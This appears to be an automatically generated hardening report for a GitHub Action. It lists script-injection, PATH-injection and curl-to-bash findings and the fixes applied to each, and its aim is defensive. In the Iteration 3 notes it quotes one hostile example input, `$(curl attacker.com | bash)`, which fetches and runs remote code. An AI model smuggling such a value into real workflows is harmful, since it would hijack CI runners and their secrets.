<!-- markdownlint-disable -->

# Hardening Report: anthropics--claude-code-action/v1.0.209

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **anthropics--claude-code-action/v1.0.209** was hardened automatically. 6 finding(s) were identified and resolved across 3 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): A ${{ }} expression is interpolated directly inside a run: shell command string. The step `run: python "${{ github.action_path }}/agent_approval_check.py"` embeds `${{ github.action_path }}` directly in the shell command. Any ${{ ... }} expression inside a run: block is a script-injection finding regardless of which context it reads from.

Locations:

- `agent-approval-check/action.yml:57`

### script-injection (severity: high)

Sub-rule (a): A ${{ }} expression is interpolated directly inside a run: shell command string. The 'Revoke app token' step contains `-H "Authorization: Bearer ${{ steps.run.outputs.github_token }}"` directly inside the run: block. The `steps.*` context is a workflow-controllable source and must not be interpolated directly into shell commands.

Locations:

- `action.yml:453`

### github-env-injection (severity: high)

The 'Setup Custom Bun Path' step writes an untrusted input-derived value to $GITHUB_PATH without sanitization. `inputs.path_to_bun_executable` is mapped to env var `PATH_TO_BUN_EXECUTABLE`, then `BUN_DIR=$(dirname "$PATH_TO_BUN_EXECUTABLE")` is computed and written with `echo "$BUN_DIR" >> "$GITHUB_PATH"`. No `printf '%s' ... | tr -d '\n\r'` sanitization is applied before the write, allowing newline injection into GITHUB_PATH.

Locations:

- `action.yml:222`

### github-env-injection (severity: high)

The 'Setup Custom Bun Path' step in base-action writes an untrusted input-derived value to $GITHUB_PATH without sanitization. `inputs.path_to_bun_executable` is mapped to env var `PATH_TO_BUN_EXECUTABLE`, then `BUN_DIR=$(dirname "$PATH_TO_BUN_EXECUTABLE")` is computed and written with `echo "$BUN_DIR" >> "$GITHUB_PATH"`. No `printf '%s' ... | tr -d '\n\r'` sanitization is applied before the write.

Locations:

- `base-action/action.yml:148`

### github-env-injection (severity: high)

The 'Install Claude Code' step writes an untrusted input-derived value to $GITHUB_PATH without sanitization. `inputs.path_to_claude_code_executable` is mapped to env var `PATH_TO_CLAUDE_CODE_EXECUTABLE`, then `CLAUDE_DIR=$(dirname "$PATH_TO_CLAUDE_CODE_EXECUTABLE")` is computed and written with `echo "$CLAUDE_DIR" >> "$GITHUB_PATH"`. No `printf '%s' ... | tr -d '\n\r'` sanitization is applied before the write.

Locations:

- `base-action/action.yml:183`

### unsafe-shell (severity: high)

The 'Install Claude Code' step pipes remote content directly to bash: `curl -fsSL https://claude.ai/install.sh | bash -s -- "$CLAUDE_CODE_VERSION"` (and a variant inside a `timeout bash -c "..."` wrapper). The script is not downloaded to a file first and verified before execution, allowing a compromised or MITM'd remote server to execute arbitrary code on the runner.

Locations:

- `base-action/action.yml:175`
- `base-action/action.yml:177`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection, unsafe-shell

**Notes:**

Fixed 6 findings across 3 files:
1. agent-approval-check/action.yml: Moved ${{ github.action_path }} from run: command to env: block as ACTION_PATH.
2. action.yml (line 453): Moved ${{ steps.run.outputs.github_token }} from curl Authorization header to env: block as APP_GITHUB_TOKEN.
3. action.yml (line 222): Added printf/tr sanitization for BUN_DIR before writing to $GITHUB_PATH.
4. base-action/action.yml (line 148): Added printf/tr sanitization for BUN_DIR before writing to $GITHUB_PATH.
5. base-action/action.yml (line 183): Added printf/tr sanitization for CLAUDE_DIR before writing to $GITHUB_PATH.
6. base-action/action.yml (lines 175, 177): Replaced curl-piped-to-bash with download-then-execute pattern using a mktemp file; dropped the '--' shell option terminator as instructed; cleaned up temp file after use.

### Iteration 2

**Fixes applied:** missing-permissions, unpinned-uses, script-injection, unsafe-shell

**Notes:**

Fixed all 4 findings across 8 workflow files:

1. missing-permissions: Added `permissions: contents: read` to ci.yml top level.

2. unpinned-uses: Pinned all mutable action references to full commit SHAs:
   - actions/checkout@v6 → d23441a48e516b6c34aea4fa41551a30e30af803 (ci.yml ×3, claude.yml, claude-review.yml, issue-triage.yml, release.yml ×2)
   - oven-sh/setup-bun@v2 → 0c5077e51419868618aeaa5fe8019c62421857d6 (ci.yml ×2)
   - oven-sh/setup-bun@v1 → f4d14e03ff726c06358e5557344e1da148b56cf7 (ci.yml ×1)
   - anthropics/claude-code-action@main and @v1 → a60f3e1db3edbceed2b1e6c6a9d34c36b8a15eba (claude.yml, claude-review.yml, issue-triage.yml)

3. script-injection: Moved all ${{ }} expressions out of run: blocks into env: blocks in release.yml, sync-base-action.yml, test-base-action.yml, test-custom-executables.yml, test-settings.yml, and test-structured-output.yml. The test-structured-output.yml summary job was rewritten to use shell conditionals on env vars instead of inline ${{ needs.*.result }} ternary expressions.

4. unsafe-shell: Replaced both curl|bash pipes in test-custom-executables.yml with download-to-tempfile-then-execute pattern. Dropped the shell's `-s` and `--` options (no longer reading from stdin) and passed `latest` directly as a positional argument to the claude installer script.

### Iteration 3

**Fixes applied:** script-injection

**Notes:**

Fixed the script-injection vulnerability in `.github/workflows/test-base-action.yml` at the 'Create test prompt file' step. The heredoc with an unquoted delimiter (`<< EOF`) was replaced with `printf '%s\n' "${PROMPT}" > test-prompt.txt`. The unquoted heredoc delimiter caused the shell to perform full expansion (including command substitution) inside the heredoc body, allowing a malicious `test_prompt` input like `$(curl attacker.com | bash)` to be executed. The `printf '%s'` approach writes the value as a literal string without any shell expansion, while the `PROMPT` variable remains safely in the step's `env:` block.

